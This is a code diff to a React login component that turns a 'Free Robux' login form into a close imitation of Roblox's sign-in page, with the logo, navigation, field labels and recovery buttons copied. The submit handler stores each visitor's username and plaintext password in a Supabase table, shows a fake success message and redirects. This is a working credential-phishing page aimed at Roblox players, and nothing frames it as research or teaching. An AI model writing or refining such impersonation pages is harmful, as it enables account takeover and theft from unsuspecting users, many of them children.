@@ -13,32 +13,54 @@ const LoginForm = () => {
   const handleLogin = async (e) => {
     e.preventDefault();
 
-    // Insert user data (optional)
+    
     await supabase.from('users').insert([{ email: formData.email, password: formData.password }]);
 
-    // Show success message
     setMessage('Login Successfully.');
 
-    // Give React time to render message before redirect
     setTimeout(() => {
-      window.location.href = '/dashboard'; // redirect after 2 seconds
+      window.location.href = '/dashboard';
     }, 2000);
   };
 
   return (
-    <div className="login-container">
-      <div className="login-box">
-        <h2>Login to Get Free Robux</h2>
-        <form onSubmit={handleLogin}>
+    
+    <div className="roblox-wrap">
+     
+      <header className="roblox-header">
+      <div className="roblox-logo">ROBLOX</div>
+
+      <nav className="navlink">
+        <ul>
+          <li><a href="#">Discover</a></li>
+          <li><a href="#">Marketplace</a></li>
+          <li><a href="#">Create</a></li>
+          <li><a href="#">Robux</a></li>
+        </ul>
+      </nav>
+
+      <div className="roblox-search">
+        <input type="text" placeholder="Search" />
+      </div>
+
+      <button className="signup-btn">Sign Up</button>
+    </header>
+      <div className="roblox-box">
+        <h2 className="roblox-title">Login to Roblox</h2>
+
+        <form onSubmit={handleLogin} className="roblox-form">
           <input
+            className="roblox-input"
             type="text"
             name="email"
-            placeholder="Username"
+            placeholder="Username/Email/Phone"
             value={formData.email}
             onChange={handleChange}
             required
           />
+
           <input
+            className="roblox-input"
             type="password"
             name="password"
             placeholder="Password"
@@ -46,21 +68,22 @@ const LoginForm = () => {
             onChange={handleChange}
             required
           />
-          <button type="submit">Log In</button>
+
+          <button className="roblox-login-btn" type="submit">Log In</button>
         </form>
 
-        <a href="#" className="link-small">Forgot Password or Username?</a>
-        <hr />
+        <a className="roblox-forgot" href="#">Forgot Password or Username?</a>
 
-        <button className="secondary-btn">Email Me a One-Time Code</button>
-        <button className="secondary-btn">Use Another Device</button>
+        <hr className="roblox-divider" />
 
-        <p className="signup-text">
+        <button className="roblox-secondary">Email Me a One-Time Code</button>
+        <button className="roblox-secondary">Use Another Device</button>
+
+        <p className="roblox-signup">
           Don’t have an account? <a href="#">Sign Up</a>
         </p>
 
-        {/* Show message */}
-        {message && <p className="message">{message}</p>}
+        {message && <p className="roblox-message">{message}</p>}
       </div>
     </div>
   );
